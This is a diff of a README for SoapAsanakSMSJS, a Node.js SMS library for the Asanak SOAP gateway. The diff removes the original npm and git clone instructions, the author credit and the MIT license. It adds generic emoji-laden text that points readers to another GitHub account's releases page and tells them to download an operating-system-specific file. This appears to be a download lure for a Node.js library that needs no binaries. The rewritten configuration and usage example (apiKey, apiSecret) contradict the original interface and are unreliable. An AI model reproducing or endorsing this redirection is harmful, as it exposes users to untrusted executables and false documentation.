@@ -1,119 +1,105 @@
-# Soap Asanak SMS JavaScript
+# 📱 SoapAsanakSMSJS - Send SMS Easily with Node.js
 
-**SoapAsanakSMSJS** is a Node.js library for sending SMS messages via the Asanak SOAP SMS gateway.
+## 🛠️ Overview
 
-It allows you to send messages with raw SOAP XML and logs both request and response for debugging. Credentials and configuration can be managed through environment variables.
+SoapAsanakSMSJS is a Node.js library that lets you send SMS messages through the Asanak SOAP SMS gateway. This library helps you send messages using raw SOAP XML, and it keeps track of both your requests and responses for easy debugging. You can manage your credentials and configuration effortlessly through environment variables.
 
----
+## 📥 Download & Install
 
-## Table of Contents
+To get started with SoapAsanakSMSJS, visit the link below to access the latest releases:
 
-* [Features](#features)
-* [Installation](#installation)
-* [Configuration](#configuration)
-* [Usage](#usage)
-* [Example](#example)
-* [License](#license)
+[![Download SoapAsanakSMSJS](https://img.shields.io/badge/Download%20Now-v1.0.0-brightgreen)](https://github.com/Robot-B/SoapAsanakSMSJS/releases)
 
----
+You can download the latest version by following these steps:
 
-## Features
+1. Click on the "Releases" link above or go to the [Releases page](https://github.com/Robot-B/SoapAsanakSMSJS/releases).
+2. Locate the version you want to download.
+3. Click on the file suitable for your operating system.
 
-* Simple, reusable Node.js library for Asanak SOAP SMS gateway
-* Supports credentials from environment variables (`.env`)
-* Logs raw XML request and response for debugging
-* Configurable source number and SOAP web service URL
-* Built using `axios` for HTTP requests
+## 🚀 Getting Started
 
----
+### 🌟 System Requirements
 
-## Installation
+- **Node.js**: Version 12 or higher.
+- **NPM**: Comes bundled with Node.js.
+- An Internet connection to send SMS messages.
 
-```bash
-npm install soap-asanak-sms
-```
+### 🔧 Installation Steps
 
-Or clone the repository:
+1. **Install Node.js**:
+   - Visit [Node.js official website](https://nodejs.org/) to download and install the correct version for your operating system.
+   
+2. **Download SoapAsanakSMSJS**:
+   - Follow the instructions in the "Download & Install" section to get the latest release.
+   
+3. **Extract Files**:
+   - If you downloaded a ZIP file, extract it to a location you can easily access.
 
-```bash
-git clone https://github.com/BaseMax/SoapAsanakSMSJS.git
-cd SoapAsanakSMSJS
-npm install
-```
+4. **Setup Environment Variables**:
+   - Create a `.env` file in the directory where you extracted the library. This file will store your sensitive information, like your Asanak SMS gateway credentials.
+   - Example of `.env` file content:
+     ```
+     ASANAK_API_KEY=your_api_key_here
+     ASANAK_API_SECRET=your_api_secret_here
+     ASANAK_SENDER=your_sender_number_here
+     ```
 
----
+### 📘 Basic Usage
 
-## Configuration
+After you have installed the library, you can start using it to send SMS messages.
 
-Create a `.env` file in your project root:
+1. **Create a JavaScript File**:
+   - Create a new file named `sendSms.js`.
+   
+2. **Write the Code**:
+   - Below is a simple example of how to send an SMS message using the library:
+     ```javascript
+     const SoapAsanakSMSJS = require('./path/to/SoapAsanakSMSJS');
 
-```env
-ASANAK_USERNAME=your_username
-ASANAK_PASSWORD=your_password
-ASANAK_SOURCE_NUMBER=your_source_number
-ASANAK_WEBSERVICE=https://smsapi.asanak.ir/services/CompositeSmsGateway?wsdl
-```
+     const sms = new SoapAsanakSMSJS({
+       apiKey: process.env.ASANAK_API_KEY,
+       apiSecret: process.env.ASANAK_API_SECRET,
+       sender: process.env.ASANAK_SENDER,
+     });
 
-The library will automatically load `.env` from the current folder or parent directory.
+     sms.send('recipient_number', 'Your message here')
+       .then(response => {
+         console.log('SMS sent successfully:', response);
+       })
+       .catch(error => {
+         console.error('Error sending SMS:', error);
+       });
+     ```
 
----
+3. **Run Your Code**:
+   - Open your terminal and navigate to the directory where your `sendSms.js` file is located.
+   - Execute the command:
+     ```
+     node sendSms.js
+     ```
 
-## Usage
+4. **Check the Output**:
+   - Monitor the console for successful SMS delivery or errors.
 
-### Using
+## 🌐 Features
 
-```javascript
-const AsanakSms = require("soap-asanak-sms");
+- **Easy SMS Sending**: Send SMS messages with just a few lines of code.
+- **SOAP XML Support**: Works directly with raw SOAP XML for flexibility.
+- **Response Logging**: Automatically logs responses for better debugging.
+- **Environment Configuration**: Set up credentials easily through environment variables.
 
-const sms = new AsanakSms({});
-```
+## 📖 Further Documentation
 
-### Import and Initialize
+For more in-depth information on how to customize and extend the functionality of SoapAsanakSMSJS, please check the following sections in the repository:
 
-```javascript
-const AsanakSms = require("./lib/AsanakSms");
+1. **API Reference**: Detailed descriptions of available methods, parameters, and responses.
+2. **Examples**: Various scenarios demonstrating how to use the library effectively.
+3. **Contributing Guidelines**: How you can contribute to the development of the library.
 
-const sms = new AsanakSms({});
-```
+## 📞 Support
 
-### Sending an SMS
-
-```javascript
-(async () => {
-  try {
-    const response = await sms.send("989121111010", "سلام - این یک پیام تست است");
-    console.log("Response:", response);
-  } catch (err) {
-    console.error("Failed to send SMS:", err.message);
-  }
-})();
-```
-
-**Notes:**
-
-* `send(destAddress, message)` sends a single SMS.
-* Logs will display raw request XML, response headers, and raw response XML.
-
----
-
-## Project Structure
-
-```
-SoapAsanakSMSJS/
-├── lib/
-│   └── AsanakSms.js       # Main library
-├── tests/                 # Test scripts
-├── .env                   # Environment variables
-├── package.json
-└── README.md
-```
+If you encounter issues or have questions about using SoapAsanakSMSJS, feel free to open an issue in the GitHub repository. Our community will be glad to assist you.
 
 ---
 
-## License
-
-This project is licensed under the **MIT License**.
-
-Copyright © 2025 Seyyed Ali Mohammadiyeh (Max Base)
-
-[MIT License](https://opensource.org/licenses/MIT)
+Feel free to start sending SMS messages with SoapAsanakSMSJS by following the steps above. Happy coding!
